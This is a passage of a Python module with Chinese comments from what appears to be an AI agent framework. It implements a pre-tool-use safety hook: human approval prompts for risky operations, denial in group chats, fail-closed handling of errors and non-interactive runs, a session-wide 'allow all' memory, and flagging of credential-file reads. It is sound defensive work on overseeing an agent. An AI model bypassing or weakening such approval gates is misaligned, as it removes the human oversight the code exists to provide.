    """会话删除时清掉它的「本次会话都允许」记忆(会话生命周期结束才清,不是每轮)。"""
    _session_approvals.pop(session_key, None)


async def _approve(reason: str, detail: str, restrict_noninteractive: bool) -> bool:
    """审批底座:有交互通道 → 弹「允许一次 / 本次会话都允许 / 拒绝」按钮并阻塞等。

    - 群聊会话:一律拒绝(批准权不能落在群成员/被拉进群的陌生人手里,见审计 #4)。
    - 无交互通道(cron/eval):按 restrict_noninteractive 决定——「对外/装包/持久化」类
      默认拒绝(fail-closed,"无人可问"≠"同意"),本地操作放行。
    - 「本次会话都允许」:选中后把该类操作记进 _session_approvals,本会话后续同类
      escalate 直接放行、不再弹窗(按 category 归类,见上)。
    - 复用 ask_user 同款 clarify 机制:回复经网关「拿锁前 resolve」解除,不会死锁。
      超时 / 发送失败 → 视为拒绝(危险操作宁可不做)。
    """
    try:
        from ..gateway import clarify
        from ..gateway.core import Choice
    except ImportError:
        return not restrict_noninteractive  # 无网关 → 非交互模式兜底

    ctx = clarify.current()
    if ctx is None:
        return not restrict_noninteractive
    if _is_group_session(ctx.session_key):
        return False
    cat = _category(reason)
    if _is_session_approved(ctx.session_key, cat):
        return True  # 本会话已选「都允许」此类操作 → 免批直接放行
    p = clarify.register(ctx.session_key, ["允许一次", "本次会话都允许", "拒绝"])
    try:
        opts = [
            (f"/clarify {p.clarify_id} 0", "✅ 允许一次"),
            (f"/clarify {p.clarify_id} 1", "♾️ 本次会话都允许"),
            (f"/clarify {p.clarify_id} 2", "🛑 拒绝"),
        ]
        prompt = f"⚠️ 需要批准:{reason}\n{detail}"
        await ctx.adapter.present_choice(ctx.chat_id, Choice(prompt=prompt, options=opts))
    except Exception:
        clarify.resolve(p.clarify_id, "拒绝")
        return False
    answer = await clarify.wait(p.clarify_id, config.CLARIFY_TIMEOUT)
    if answer == "本次会话都允许":
        _mark_session_approved(ctx.session_key, cat)
        return True
    return answer == "允许一次"


async def _ask_approval(
    tool_name: str, reason: str, tool_input: dict, restrict_noninteractive: bool = False
) -> bool:
    """PreToolUse 审批闸调用的入口:把工具入参渲染成一行说明后走 _approve。"""
    return await _approve(reason, _describe(tool_name, tool_input), restrict_noninteractive)


async def require_approval(
    reason: str, detail: str, *, restrict_noninteractive: bool = True
) -> bool:
    """供 MCP 工具(如 cron 启用/删除)复用的审批。默认非交互通道拒绝(持久化类操作
    不该在 cron 上下文里被 agent 静默改动)。"""
    return await _approve(reason, detail, restrict_noninteractive)


async def pretool_guard_hook(input_data, tool_use_id, context):
    """PreToolUse hook:先过常开正确性防线(_hard_guard),再走三档风险模型(classify)。

    这是接进 SDK 的那个 hook(build_hooks)。旧的 pretool_danger_hook 只做灾难拦截,
    保留供既有测试;新逻辑在此。_hard_guard 三项永远生效;classify 的 escalate/block
    分别由 APPROVAL_GATE / DANGER_GUARD 开关控制,allow 不受影响。
    """
    tool_name = input_data.get("tool_name", "") or ""
    tool_input = input_data.get("tool_input") or {}
    try:
        hard = _hard_guard(tool_name, tool_input, current_cwd())
        if hard:
            return hard
        # 敏感读取:只标注不拦(见上方 _sensitive_read_target 说明)
        sensitive = _sensitive_read_target(tool_name, tool_input)
        if sensitive:
            print(f"⚠️ [安全标注] 本轮读取了疑似凭据文件/命令:{sensitive}")
        verdict, reason, restrict = classify(tool_name, tool_input, cwd=current_cwd())
    except Exception:
        # 安全判定异常时无法确认操作安全,按 ADR 0003 fail-closed。
        return _deny("🛑 安全判定异常,已保守拒绝此操作。请手动检查后重试。")
    if verdict == "block" and config.DANGER_GUARD:
        return _deny(
            f"⛔ 危险命令被 {config.PERSONA_NAME} 拦截({reason})。如确需执行,请你手动在终端运行。"
        )
    if verdict == "escalate" and config.APPROVAL_GATE:
        try:
            approved = await _ask_approval(tool_name, reason, tool_input, restrict)
        except Exception:
            # 审批过程本身异常(而非模型正常操作)→ fail-closed:疑似危险操作宁可拒绝
            return _deny(f"🛑 审批过程异常,已保守拒绝此操作({reason})。请手动执行或重试。")
        if not approved:
            return _deny(
                f"🛑 你未批准此操作({reason})。已跳过;如需执行请手动运行或改用更安全方式。"
            )
    return {}


def build_hooks() -> dict | None:
    """返回挂给 ClaudeAgentOptions.hooks 的结构;SDK 不支持则 None。

    只挂 PreToolUse:危险拦截/审批闸与前台执行防线。
    """
    if HookMatcher is None:
        return None

    return {
        "PreToolUse": [HookMatcher(matcher=None, hooks=[pretool_guard_hook])],
    }
